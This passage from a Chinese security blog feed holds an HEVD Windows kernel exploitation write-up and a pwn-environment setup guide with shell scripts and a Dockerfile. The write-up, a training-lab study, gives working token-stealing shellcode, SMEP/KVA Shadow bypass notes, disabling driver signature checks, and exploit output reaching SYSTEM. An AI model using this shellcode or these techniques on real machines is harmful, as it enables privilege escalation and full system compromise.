class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0x40</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xF9</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xE5</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0xC3</span> &#125;</span><br><span class="line"><span class="comment">// 反汇编</span></span><br><span class="line"><span class="number">0</span>:  <span class="number">65</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">88</span> <span class="number">01</span>    mov    rax,QWORD PTR gs:<span class="number">0x188</span>  </span><br><span class="line"><span class="number">7</span>:  <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line"><span class="number">9</span>:  <span class="number">48</span> <span class="number">8b</span> <span class="number">80</span> b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    rax,QWORD PTR [rax+<span class="number">0xb8</span>]  </span><br><span class="line"><span class="number">10</span>: <span class="number">48</span> <span class="number">89</span> c3                mov    rbx,rax  </span><br><span class="line"><span class="number">13</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">9b</span> <span class="number">48</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    rbx,QWORD PTR [rbx+<span class="number">0x448</span>]  </span><br><span class="line"><span class="number">1</span>a: <span class="number">48</span> <span class="number">81</span> eb <span class="number">48</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    sub    rbx,<span class="number">0x448</span>  </span><br><span class="line"><span class="number">21</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">8b</span> <span class="number">40</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    rcx,QWORD PTR [rbx+<span class="number">0x440</span>]  </span><br><span class="line"><span class="number">28</span>: <span class="number">48</span> <span class="number">83</span> f9 <span class="number">04</span>             cmp    rcx,<span class="number">0x4</span>  </span><br><span class="line"><span class="number">2</span>c: <span class="number">75</span> e5                   jne    <span class="number">0x13</span>  </span><br><span class="line"><span class="number">2</span>e: <span class="number">48</span> <span class="number">8b</span> <span class="number">8b</span> b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    rcx,QWORD PTR [rbx+<span class="number">0x4b8</span>]</span><br><span class="line"><span class="number">35</span>: <span class="number">80</span> e1 f0                <span class="keyword">and</span>    cl,<span class="number">0xf0</span>  </span><br><span class="line"><span class="number">38</span>: <span class="number">48</span> <span class="number">89</span> <span class="number">88</span> b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    QWORD PTR [rax+<span class="number">0x4b8</span>],rcx  </span><br><span class="line"><span class="number">3f</span>: <span class="number">48</span> <span class="number">31</span> c0                <span class="keyword">xor</span>    rax,rax  </span><br><span class="line"><span class="number">42</span>: c3                      ret</span><br></pre></td></tr></table></figure>

<p>是写成功了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3: kd&gt; dq 0xFFFFDC04FE779850</span><br><span class="line">ffffdc04`fe779850  00018825`048b4865 000000b8`808b4800</span><br><span class="line">ffffdc04`fe779860  04489b8b`48c38948 000448eb`81480000</span><br><span class="line">ffffdc04`fe779870  00000440`8b8b4800 8b48e575`04f98348</span><br><span class="line">ffffdc04`fe779880  f0e18000`0004b88b 48000004`b8888948</span><br><span class="line">ffffdc04`fe779890  00000000`00c3c031 00007ff7`85ad32d8</span><br><span class="line">ffffdc04`fe7798a0  00000000`00000000 00000000`00413f2e</span><br><span class="line">ffffdc04`fe7798b0  6b636148`02070000 61005400`00000000</span><br><span class="line">ffffdc04`fe7798c0  00018825`048b4865 000000b8`808b4800</span><br></pre></td></tr></table></figure>

<p>但是直接写无法运行，无法提权：保护机制的绕过。</p>
<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>bypass KASLR: 获取内核基址 <code>ntoskrnl.exe</code> 地址：遍历驱动，获取内核基址<br>bypass SEMP&#x2F;SMAP: 修改CR4寄存器，将20，21位置0<br>bypass KVA Sahdow: 内核页表隔离KVA(KPTI)，也就是<a href="https://alvinovo.top/post/memory-page-table-isolation/#3-1-KVA-Shadow">KVA Shadow</a>，当执行内核代码时，用户态代码记录为 <code>NX</code></p>
<ul>
<li>AllocPoolWithTag 获得的内存一般是可执行的，因此可以往内存中写，然后执行</li>
<li>执行<code>swapgs</code>绕过</li>
</ul>
<p>如果CR4寄存器的第20位被设置为1，那么就启用了SMEP；21位smap <a href="https://www.cnblogs.com/HcyRcer/p/16559321.html">Cr0-Cr4</a>。这里看到smep，smap都存在。SMEP存在就可以执行用户态代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2: kd&gt; r cr4</span><br><span class="line">cr4=0000000000350ef8</span><br><span class="line">2: kd&gt; .formats cr4</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     00000000`00350ef8</span><br><span class="line">  Decimal: 3477240</span><br><span class="line">  Decimal (unsigned) : 3477240</span><br><span class="line">  Octal:   0000000000000015207370</span><br><span class="line">  Binary:  00000000 00000000 00000000 00000000 00000000 00110101 00001110 11111000</span><br><span class="line">  Chars:   .....5..</span><br><span class="line">  Time:    Tue Feb 10 13:54:00 1970</span><br><span class="line">  Float:   low 4.87265e-039 high 0</span><br><span class="line">  Double:  1.71798e-317</span><br></pre></td></tr></table></figure>

<p>寻找ROP：使用ropper&#x2F;ROPgadget工具，在 <code>ntoskrnl.exe</code> 寻找</p>
<ul>
<li><code>C:\Windows\WinSxS\amd64_microsoft-windows-os-kernelxxx\ntoskrnl.exe</code></li>
</ul>
<p>寻找gadget</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; imagebase <span class="number">0</span>x0</span><br><span class="line">[INFO] Imagebase <span class="built_in">set</span> to <span class="number">0</span>x0</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search mov cr4, r</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://vulndev.io/2022/07/02/windows-kernel-exploitation-hevd-x64-stackoverflow/">Windows Kernel Exploitation x64 Stack Overflow </a>为了不崩溃，shellcode需要添加bypass KVA Shadow。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">[BITS <span class="number">64</span>]</span><br><span class="line">start:</span><br><span class="line">  mov rax, [gs:<span class="number">0x188</span>]       ; KPCRB.<span class="built_in">CurrentThread</span> (_KTHREAD)</span><br><span class="line">  mov rax, [rax + <span class="number">0xb8</span>]     ; APCState.<span class="built_in">Process</span> (current _EPROCESS)</span><br><span class="line">  mov r8, rax               ; Store current _EPROCESS ptr in RBX</span><br><span class="line"> </span><br><span class="line">loop:</span><br><span class="line">  mov r8, [r8 + <span class="number">0x448</span>]      ; ActiveProcessLinks</span><br><span class="line">  sub r8, <span class="number">0x448</span>             ; Go back to start of _EPROCESS</span><br><span class="line">  mov r9, [r8 + <span class="number">0x440</span>]      ; <span class="built_in">UniqueProcessId</span> (PID)</span><br><span class="line">  cmp r9, <span class="number">4</span>                 ; SYSTEM PID? </span><br><span class="line">  jnz loop                  ; Loop until PID == <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">replace:</span><br><span class="line">  mov rcx, [r8 + <span class="number">0x4b8</span>]      ; Get SYSTEM token</span><br><span class="line">  <span class="keyword">and</span> cl, <span class="number">0xf0</span>               ; Clear low <span class="number">4</span> bits of _EX_FAST_REF structure</span><br><span class="line">  mov [rax + <span class="number">0x4b8</span>], rcx     ; Copy SYSTEM token to current process</span><br><span class="line"> </span><br><span class="line">cleanup:</span><br><span class="line">  mov rax, [gs:<span class="number">0x188</span>]       ; _KPCR.Prcb.CurrentThread</span><br><span class="line">  mov cx, [rax + <span class="number">0x1e4</span>]     ; KTHREAD.KernelApcDisable</span><br><span class="line">  inc cx</span><br><span class="line">  mov [rax + <span class="number">0x1e4</span>], cx</span><br><span class="line">  mov rdx, [rax + <span class="number">0x90</span>]     ; ETHREAD.TrapFrame</span><br><span class="line">  mov rcx, [rdx + <span class="number">0x168</span>]    ; ETHREAD.TrapFrame.Rip</span><br><span class="line">  mov r11, [rdx + <span class="number">0x178</span>]    ; ETHREAD.TrapFrame.EFlags</span><br><span class="line">  mov rsp, [rdx + <span class="number">0x180</span>]    ; ETHREAD.TrapFrame.Rsp</span><br><span class="line">  mov rbp, [rdx + <span class="number">0x158</span>]    ; ETHREAD.TrapFrame.Rbp</span><br><span class="line">  <span class="keyword">xor</span> eax, eax  ;</span><br><span class="line">  swapgs</span><br><span class="line">  o64 sysret </span><br></pre></td></tr></table></figure>

<p>某个地址读写，断点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; ba e1 &lt;ObjectAddr&gt;</span><br></pre></td></tr></table></figure>

<p>最终结果</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>\<span class="title">Desktop</span>\<span class="title">HEVDExploit.exe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Spray</span> <span class="title">use</span> <span class="title">write</span> <span class="title">pipe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Create</span> <span class="title">UAF</span> <span class="title">Object</span> <span class="title">then</span> <span class="title">free</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Prepare</span> <span class="title">shellcode</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Spray</span> <span class="title">to</span> <span class="title">get</span> <span class="title">the</span> <span class="title">UAF</span> <span class="title">object</span> <span class="title">then</span> <span class="title">write</span> <span class="title">shellcode</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Trigger</span> <span class="title">UAF</span> <span class="title">callback</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Windows</span> [版本 10.0.19045.3930]</span></span><br><span class="line"><span class="function">(<span class="title">c</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span>。保留所有权利。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br></pre></td></tr></table></figure>

<p>tip: kernel可以访问VirtualAlloc的内存区域，但是最好不允许换出内存。</p>
<p>因为 NonPagedPool 是有可执行权限的😢</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LPVOID pShellcode = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(pShellcode, StealToken, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">LPVOID pKernelStack = <span class="built_in">VirtualAlloc</span>((LPVOID)stackAddr, <span class="number">0x14000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">VirtualLock</span>(pKernelStack, <span class="number">0x14000</span>)) &#123;</span><br><span class="line">	<span class="built_in">Error</span>(<span class="string">&quot;VirtualLock&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>因为这里的内存池是NonPagedPool，存在可执行权限，因此是可以写shellcode的</p>
<p>参考的文章，池风水使用了NamedPipe，可能没什么用，因为NamedPipe在NonPagedPoolNx中获得，不是一个pool，因此没必要spray named pipe</p>
<h3 id="Exploit-NonPagedPoolNx"><a href="#Exploit-NonPagedPoolNx" class="headerlink" title="Exploit NonPagedPoolNx"></a>Exploit NonPagedPoolNx</h3><p>没有执行权限</p>
<p>NonPagedPool的exp也可以使用。</p>
<p>其余做法：<a href="https://github.com/vportal/HEVD/blob/main/README.md">HEVD</a></p>
<ul>
<li>使用FakeObj来伪造一个NamedPipe，结合double free从而可以任意的读</li>
<li>使用NtFsControlFile将NamedPipe改成unbuffered</li>
<li>修改 Irp-&gt;SystemBuffer 任意写</li>
</ul>
<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Windows 无法验证此设备所需的驱动程序的数字签名。某软件或硬件最近有所更改，可能安装了签名错误或损毁的文件，或者安装的文件可能是来路不明的恶意软件。</p>
<ul>
<li>更新与安全-&gt;恢复-&gt;高级启动-&gt;立刻重新启动-&gt;疑难解答-&gt;高级选项-&gt;禁用驱动强制签名（F7</li>
</ul>
<p>永久禁用驱动签名？不行？</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> nointegritychecks on</span><br></pre></td></tr></table></figure>

<p>加载HEVD驱动，我们得先找到其驱动目录，因此我们可以创建目录，将pdb文件扔进去</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !sym noisy</span><br><span class="line">noisy <span class="built_in">mode</span> - symbol prompts on</span><br><span class="line"></span><br><span class="line"># 显示符号</span><br><span class="line"><span class="number">0</span>: kd&gt; x /D HEVD!*</span><br><span class="line"> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">SYMSRV:  <span class="title">BYINDEX</span>: 0<span class="title">x8</span></span></span><br><span class="line"><span class="function">         <span class="title">c</span>:\<span class="title">symbols</span>*<span class="title">https</span>://<span class="title">msdl.microsoft.com</span>/<span class="title">download</span>/<span class="title">symbols</span></span></span><br><span class="line"><span class="function">         <span class="title">HEVD.pdb</span></span></span><br><span class="line"><span class="function">         1<span class="title">A8235FDCA7F46E08A07A47D79B5A8991</span></span></span><br><span class="line"><span class="function"><span class="title">SYMSRV</span>:  <span class="title">UNC</span>: <span class="title">c</span>:\<span class="title">symbols</span>\<span class="title">HEVD.pdb</span>\1<span class="title">A8235FDCA7F46E08A07A47D79B5A8991</span>\<span class="title">HEVD.pdb</span> - <span class="title">path</span> <span class="title">not</span> <span class="title">found</span></span></span><br><span class="line"><span class="function">...</span></span><br></pre></td></tr></table></figure>

<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>翻到了一篇CVE分析，其中利用到了token替换技术：<a href="https://bbs.kanxue.com/thread-277554.htm">CVE-2022-37969 漏洞利用</a>,一个优秀的利用对象：pipe</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreatePipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hReadPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hWritePipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 nSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>会在内核空间创建 <code>PipeAttribute</code>，PipeAttribute结构是在<code>PagedPool</code>中分配的内核空间中属性的表示，构造后可以造成任意地址的读写</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeAttribute</span> &#123;</span><br><span class="line">    LIST_ENTRY list ;</span><br><span class="line">    <span class="type">char</span> * AttributeName;</span><br><span class="line">    <span class="type">uint64_t</span> AttributeValueSize;</span><br><span class="line">    <span class="type">char</span> * AttributeValue;</span><br><span class="line">    <span class="type">char</span> data [<span class="number">0</span>];</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line"> &#125; LIST_ENTRY, *PLIST_ENTRY, PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>因此可以不写汇编而达到steal token 的目的</p>
<ul>
<li>使用适当的参数调用<code>NtQuerySystemInformation</code> API获取当前进程和拥有SYSTEM特权的System进程（PID 4）的_EPROCESS和_TOKEN</li>
<li>调用OpenProcessToken函数打开与当前进程关联的访问令牌</li>
<li>根据漏洞替换token</li>
</ul>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://mdanilor.github.io/posts/">Posts (mdanilor.github.io)</a></li>
<li><a href="https://paper.seebug.org/1743/">Scoop the Windows 10 pool !</a></li>
<li><a href="https://bbs.kanxue.com/thread-276550.htm">win提权漏洞文章收集</a></li>
<li><a href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D/D0Dx2DUrzLtg0D7uP+D&alichlgref=https://xz.aliyun.com/">Windows内核利用小总结</a></li>
<li><a href="https://www.alex-ionescu.com/?p=231">Sheep Year Kernel Heap Fengshui</a></li>
<li><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids’ Pool</a></li>
</ul>
]]></content>
      <categories>
        <category>HEVD</category>
      </categories>
      <tags>
        <tag>HEVD</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN-INIT</title>
    <url>/2023/06/05/PWN-ENV-INIT/</url>
    <content><![CDATA[<blockquote>
<p>搭建一个pwn环境。</p>
</blockquote>
<span id="more"></span>

<ul>
<li><code>apt</code> or <code>apt-get</code>? 虽然我使用apt出现warning,但是依然能用<ul>
<li>在脚本中，更加推荐 <code>apt-get</code></li>
<li><code>-y</code> yes 避免交互而产生错误</li>
</ul>
</li>
</ul>
<h3 id="VM-or-WSL"><a href="#VM-or-WSL" class="headerlink" title="VM or WSL"></a>VM or WSL</h3><blockquote>
<p>安装必备的应用</p>
</blockquote>
<p>root下使用，但是普通用户无法使用<code>gdb插件</code>功能，因为gdbinit文件的位置，我们可以复制一份到自己的用户目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line"></span><br><span class="line">apt-get install -y patchelf</span><br><span class="line">apt-get install -y wget</span><br><span class="line">apt-get install -y zip</span><br><span class="line">apt-get install -y tzdata</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools socat ruby ruby-dev locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># python工具</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper z3-solver angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># 换源，可选</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwngdb</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuapt-getx/Pwngdb.git </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/Pwngdb/.gdbinit &gt;&gt; ~/.gdbinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># gem源</span></span><br><span class="line">gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccomp-tools</span></span><br><span class="line">gem install seccomp-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget</span></span><br><span class="line">gem install one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwninit</span></span><br><span class="line">apt-get install liblzma-dev pkgconf</span><br><span class="line">apt-get install cargo</span><br><span class="line">cargo install pwninit</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker 自己选择</span></span><br><span class="line"><span class="comment"># apt-get install docker.io</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu 自己选择</span></span><br><span class="line"><span class="comment"># apt-get install qemu qemu-system qemu-user-static binfmt-support</span></span><br></pre></td></tr></table></figure>

<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>搭建更加容易</p>
<p>由于某些题目没有Libc版本，而是给出了Dockerfile。或者说，不想下载虚拟机。</p>
<ul>
<li>glibc-all-in-one 下载一个libc 进行patch(但是<code>patchelf</code>容易导致程序破坏).</li>
<li>自己的docker环境</li>
</ul>
<p>docker环境搭建: 更改VERSION就行，禁止交互。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ARG</span> VERSION=<span class="number">20.04</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:$VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND noninteractive </span><br><span class="line"><span class="comment"># ENV TZ=Asia/Shanghai</span></span><br><span class="line"><span class="comment">########## solve some error ##############</span></span><br><span class="line"><span class="comment"># 定义时区参数</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># 设置时区</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># 设置编码</span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./pwninit.sh /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /root/pwninit.sh &amp;&amp; /root/pwninit</span></span><br></pre></td></tr></table></figure>

<p>pwninit: 只需要安装部分工具</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># others</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># 换源，可选</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<p>创建一个容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -h &lt;repo&gt;:&lt;tag&gt; .</span><br><span class="line"><span class="comment"># -f 指定dockerfile</span></span><br><span class="line"><span class="comment"># repo 形式 xxx/xxx</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p>进入docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu:VERSION /bin/bash</span><br><span class="line"><span class="comment"># -v dir:dir 共享文件夹</span></span><br></pre></td></tr></table></figure>

<p>docker 命令</p>
<ul>
<li>-i: 交互式</li>
<li>-t: terminl</li>
<li>-v hostDir:dockerDir 共享文件夹</li>
<li>ps -a: 查看所有的容器</li>
</ul>
<p>停止后重新计入容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start &lt;ID&gt;</span><br><span class="line">docker attach &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<p>停止容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<p>删除容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<p>删除镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<h4 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h4><p>error 1</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">******</span><br><span class="line">Your encoding (ANSI_X3.4-1968) is different than UTF-8. pwndbg might not work properly.</span><br><span class="line">You might try launching gdb with:</span><br><span class="line">    LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdb</span><br><span class="line">Make sure that en_US.UTF-8 is activated <span class="keyword">in</span> /etc/locale.gen and you called locale-gen</span><br><span class="line">******</span><br></pre></td></tr></table></figure>

<p>error 2</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/gdbinit.py&quot;</span>, line 58, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import pwndbg  <span class="comment"># noqa: F401</span></span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/__init__.py&quot;</span>, line 86, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    config_mod.init_params()</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 159, <span class="keyword">in</span> init_params</span><br><span class="line">    Parameter(p)</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 45, <span class="keyword">in</span> __init__</span><br><span class="line">    self.value = param.value</span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128)</span></span><br><span class="line"><span class="string">------- tip of the day (disable with set show-tips off) -------</span></span><br></pre></td></tr></table></figure>

<p>出现了如上错误。寻找到一个<a href="https://github.com/pwndbg/pwndbg/issues/1539">issue</a></p>
<ul>
<li>error1，修改dockerfile的类似如下变量。选择中国</li>
<li>error2  也解决了。</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ENV LANG en_US.utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们的设置</span></span><br><span class="line"><span class="comment"># 定义时区参数</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># 设置时区</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># 设置编码</span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure>

